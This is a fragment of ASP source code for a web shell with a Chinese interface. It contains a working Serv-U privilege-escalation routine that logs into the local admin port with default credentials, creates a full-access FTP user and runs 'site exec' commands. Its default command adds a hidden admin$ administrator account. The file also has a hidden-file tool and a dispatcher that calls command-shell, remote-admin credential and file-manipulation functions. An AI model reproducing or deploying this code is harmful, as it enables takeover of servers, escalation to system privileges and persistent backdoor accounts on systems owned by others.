bgcolor='#FFFFFF'>服务器CPU数量</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("NUMBER_OF_PROCESSORS")&"</td></tr><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器操作系统</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("OS")&"</td></tr><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>WEB服务器版本</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("SERVER_SOFTWARE")&"</td></tr>"
For i=0 To 13
SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>"&ObT(i,0)&"</td><td bgcolor='#FFFFFF'>"&ObT(i,1)&"</td><td bgcolor='#FFFFFF' align=left>"&ObT(i,2)&"</td></tr>"
Next
RRS SI
Err.Clear
function Alexa(AlexaURL)
on error resume next 
dim getsms,getstr,url
dim star,endd
url="http://data.alexa.com/data?cli=10&dat=snba&url="&AlexaURL
getsms=getHTTPPage(url)
if getsms<>"" then
star=instr(getsms,"<REACH RANK=""")+13
endd=instr(star,getsms,"</SD>")
getstr=mid(getsms,star,endd-star-4)
else
getstr="无排名"
end if
if IsNumeric(getstr)=false then getstr="无排名"
Alexa=getstr
end function
function getHTTPPage(url) 
on error resume next 
dim http 
set http=Server.createobject("Microsoft.XMLHTTP") 
Http.open "GET",url,false 
Http.send() 
if Http.readystate<>4 then
getHTTPPage=""
exit function 
end if 
getHTTPPage=bytes2BSTR(Http.responseBody) 
set http=nothing
if err.number<>0 then err.Clear  
end function 
Function bytes2BSTR(vIn) 
dim strReturn 
dim i1,ThisCharCode,NextCharCode 
strReturn = "" 
For i1 = 1 To LenB(vIn) 
ThisCharCode = AscB(MidB(vIn,i1,1)) 
If ThisCharCode < &H80 Then 
strReturn = strReturn & Chr(ThisCharCode) 
Else 
NextCharCode = AscB(MidB(vIn,i1+1,1)) 
strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode)) 
i1 = i1 + 1 
End If 
Next 
bytes2BSTR = strReturn 
    Err.Clear
End Function:function Unlin(bb):for i = 1 to len(bb):if mid(bb,i,1)<>"" then
tmp = Mid(bb, i, 1) + tmp
else:tmp=vbcrlf&tmp
end if
next:Unlin=tmp:end function:function AA(asp):mianasp=split(asp,"."):for i=0 to UBound(mianasp)-1:hao=mianasp(i):aspcode=aspcode+chr(hao):next:AA=aspcode:end function
Case "Servu"
SUaction=request("SUaction")
if  not isnumeric(SUaction) then response.end
user = trim(request("u"))
pass = trim(request("p"))
port = trim(request("port"))
cmd = trim(request("c"))
f=trim(request("f"))
if f="" then
f=gpath()
else
f=left(f,2)
end if
ftpport = 65500
timeout=3
loginuser = "User " & user & vbCrLf
loginpass = "Pass " & pass & vbCrLf
deldomain = "-DELETEDOMAIN" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & " PortNo=" & ftpport & vbCrLf
mt = "SITE MAINTENANCE" & vbCrLf
newdomain = "-SETDOMAIN" & vbCrLf & "-Domain=goldsun|0.0.0.0|" & ftpport & "|-1|1|0" & vbCrLf & "-TZOEnable=0" & vbCrLf & " TZOKey=" & vbCrLf
newuser = "-SETUSERSETUP" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & "-PortNo=" & ftpport & vbCrLf & "-User=go" & vbCrLf & "-Password=od" & vbCrLf & _
        "-HomeDir=c:\\" & vbCrLf & "-LoginMesFile=" & vbCrLf & "-Disable=0" & vbCrLf & "-RelPaths=1" & vbCrLf & _
        "-NeedSecure=0" & vbCrLf & "-HideHidden=0" & vbCrLf & "-AlwaysAllowLogin=0" & vbCrLf & "-ChangePassword=0" & vbCrLf & _
        "-QuotaEnable=0" & vbCrLf & "-MaxUsersLoginPerIP=-1" & vbCrLf & "-SpeedLimitUp=0" & vbCrLf & "-SpeedLimitDown=0" & vbCrLf & _
        "-MaxNrUsers=-1" & vbCrLf & "-IdleTimeOut=600" & vbCrLf & "-SessionTimeOut=-1" & vbCrLf & "-Expire=0" & vbCrLf & "-RatioUp=1" & vbCrLf & _
        "-RatioDown=1" & vbCrLf & "-RatiosCredit=0" & vbCrLf & "-QuotaCurrent=0" & vbCrLf & "-QuotaMaximum=0" & vbCrLf & _
        "-Maintenance=System" & vbCrLf & "-PasswordType=Regular" & vbCrLf & "-Ratios=None" & vbCrLf & " Access=c:\\|RWAMELCDP" & vbCrLf
quit = "QUIT" & vbCrLf
newuser=replace(newuser,"c:",f)
select case SUaction
case 1
set a=Server.CreateObject("Microsoft.XMLHTTP")
a.open "GET", "http://127.0.0.1:" & port & "/goldsun/upadmin/s1",True, "", ""
a.send loginuser & loginpass & mt & deldomain & newdomain & newuser & quit
set session("a")=a
RRS"<form method='post' name='goldsun'>"
RRS"<input name='u' type='hidden' id='u' value='"&user&"'></td>"
RRS"<input name='p' type='hidden' id='p' value='"&pass&"'></td>"
RRS"<input name='port' type='hidden' id='port' value='"&port&"'></td>"
RRS"<input name='c' type='hidden' id='c' value='"&cmd&"' size='50'>"
RRS"<input name='f' type='hidden' id='f' value='"&f&"' size='50'>"
RRS"<input name='SUaction' type='hidden' id='SUaction' value='2'></form>"
RRS"<script language='javascript'>"
RRS"document.write('<center>正在连接 127.0.0.1:"&port&",使用用户名: "&user&",口令："&pass&"...<center>');"
RRS"setTimeout('document.all.goldsun.submit();',4000);"
RRS"</script>"
case 2
set b=Server.CreateObject("Microsoft.XMLHTTP")
b.open "GET", "http://127.0.0.1:" & ftpport & "/goldsun/upadmin/s2", True, "", ""
b.send "User go" & vbCrLf & "pass od" & vbCrLf & "site exec " & cmd & vbCrLf & quit
set session("b")=b
RRS"<form method='post' name='goldsun'>"
RRS"<input name='u' type='hidden' id='u' value='"&user&"'></td>"
RRS"<input name='p' type='hidden' id='p' value='"&pass&"'></td>"
RRS"<input name='port' type='hidden' id='port' value='"&port&"'></td>"
RRS"<input name='c' type='hidden' id='c' value='"&cmd&"' size='50'>"
RRS"<input name='f' type='hidden' id='f' value='"&f&"' size='50'>"
RRS"<input name='SUaction' type='hidden' id='SUaction' value='3'></form>"
RRS"<script language='javascript'>"
RRS"document.write('<center>正在提升权限,请等待...,<center>');"
RRS"setTimeout(""document.all.goldsun.submit();"",4000);"
RRS"</script>"
case 3
set c=Server.CreateObject("Microsoft.XMLHTTP")
a.open "GET", "http://127.0.0.1:" & port & "/goldsun/upadmin/s3", True, "", ""
a.send loginuser & loginpass & mt & deldomain & quit
set session("a")=a
RRS"<center>提权完毕,已执行了命令：<br><font color=red>"&cmd&"</font><br><br>"
RRS"<input type=button value=' 返回继续 ' onClick=""location.href='?Action=Servu';"">"
RRS"</center>"
case else
on error resume next
set a=session("a")
set b=session("b")
set c=session("c")
a.abort
Set a = Nothing
b.abort
Set b = Nothing
c.abort
Set c = Nothing
RRS"<center><form method='post' name='goldsun'>"
RRS"<table width='494' height='163' border='1' cellpadding='0' cellspacing='1' bordercolor='#666666'>"
RRS"<tr align='center' valign='middle'>"
RRS"<td colspan='2'>Serv-U 提升权限 by Sam</td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td width='100'>用户名:</td>"
RRS"<td width='379'><input name='u' type='text' id='u' value='LocalAdministrator'></td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td>口 令：</td>"
RRS"<td><input name='p' type='text' id='p' value='#l@$ak#.lk;0@P'></td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td>端 口：</td>"
RRS"<td><input name='port' type='text' id='port' value='43958'></td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td>系统路径：</td>"
RRS"    <td><input name='f' type='text' id='f' value='"&f&"' size='8'></td>"
RRS"  </tr>"
RRS"  <tr align='center' valign='middle'>"
RRS"    <td>命　令：</td>"
RRS"    <td><input name='c' type='text' id='c' value='cmd /c net user admin$ 123456 /add & net localgroup administrators admin$ /add' size='50'></td>"
RRS"  </tr>"
RRS" <tr align='center' valign='middle'>"
RRS"    <td colspan='2'><input type='submit' name='Submit' value='提交'> "
RRS"<input type='reset' name='Submit2' value='重置'>"
RRS"<input name='SUaction' type='hidden' id='action' value='1'></td>"
RRS"</tr></table></form></center>"
end select
function Gpath()
on error resume next
err.clear
set f=Server.CreateObject("Scripting.FileSystemObject")
if err.number>0 then
gpath="c:"
exit function
end if
gpath=f.GetSpecialFolder(0)
gpath=lcase(left(gpath,2))
set f=nothing
end function
sub SetFileText
rrs "<form method=post>"
rrs "路&nbsp;&nbsp;&nbsp;&nbsp;径：<input name=path value='"&server.mappath(".")&"\' size='30'>(一定要以\结尾)<br />"
rrs "文件名称：<input name=filename value='"&URL&"' size='30'></br>"
rrs "<input type=submit name=textfield value=******我隐****** onBlur=form.submit()>"
rrs "<br>娃嘎嘎,超级无敌隐藏文件,必须设置文件夹为显示隐藏,显示系统文件,才能显出来</br>"
rrs "<br>此工具为奸淫掳掠,杀人放火,打砸抢烧,居家必备工具</br>"
rrs "</form>"
set path=request.Form("path")
set fileName=request.Form("filename")
if( (len(path)>0)and(len(fileName)>0) )then
Set fso=Server.CreateObject("Scripting.FileSystemObject")
Set file=fso.getFile(path&fileName)
file.attributes=39
end if
end sub
  case "MMD":MMD()
  Case "ReadREG":call ReadREG()
  Case "Show1File":Set ABC=New LBF:ABC.Show1File(Session("FolderPath")):Set ABC=Nothing
  Case "DownFile":DownFile FName:ShowErr()
  Case "DelFile":Set ABC=New LBF:ABC.DelFile(FName):Set ABC=Nothing
  Case "EditFile":Set ABC=New LBF:ABC.EditFile(FName):Set ABC=Nothing
  Case "CopyFile":Set ABC=New LBF:ABC.CopyFile(FName):Set ABC=Nothing
  Case "MoveFile":Set ABC=New LBF:ABC.MoveFile(FName):Set ABC=Nothing
  Case "DelFolder":Set ABC=New LBF:ABC.DelFolder(FName):Set ABC=Nothing
  Case "CopyFolder":Set ABC=New LBF:ABC.CopyFolder(FName):Set ABC=Nothing
  Case "MoveFolder":Set ABC=New LBF:ABC.MoveFolder(FName):Set ABC=Nothing
  Case "NewFolder":Set ABC=New LBF:ABC.NewFolder(FName):Set ABC=Nothing
  Case "upfile":upfile()
  Case "TSearch":TSearch()
  Case "adminab":adminab()
  Case "pcanywhere4":pcanywhere4()
  Case "adminab":adminab()
  Case "Cmd1Shell":Cmd1Shell()
  Case "Logout":Session.Contents.Remove("kkk"):Response.Redirect URL
  Case "CreateMdb":CreateMdb FName
  Case "CompactMdb":CompactMdb FName
  Case "DbManager":DbManager()
  Case "Course":Course()
  Case "ScanDrive" : ScanDrive Request("Drive")
  Case "ScFolder"  : ScFolder Request("Folder")
  Case "Alexa":Alexa()
  Case "suftp":suftp()
  Case "upload":upload()
  Case "radmin":radmin()
  Case "pcanywhere4":pcanywhere4()
  Case "goback":goback()
  Case "jsp":jsp()
  case "php":php()
  case "apjdel":apjdel()
  case "cmdx":cmdx()
  case "aspx":aspx()
  Case "ScanDriveForm" : ScanDriveForm
  Case "ScanDrive" : ScanDrive Request("Drive")
  Case "ScFolder"  : ScFolder Request("Folder")
  Case "SetFileText":SetFileText()
  Case Else MainForm()
End Select
if Action<>"Servu" then ShowErr()
RRS"</body></html>"   %></body></html></body></html></body></html>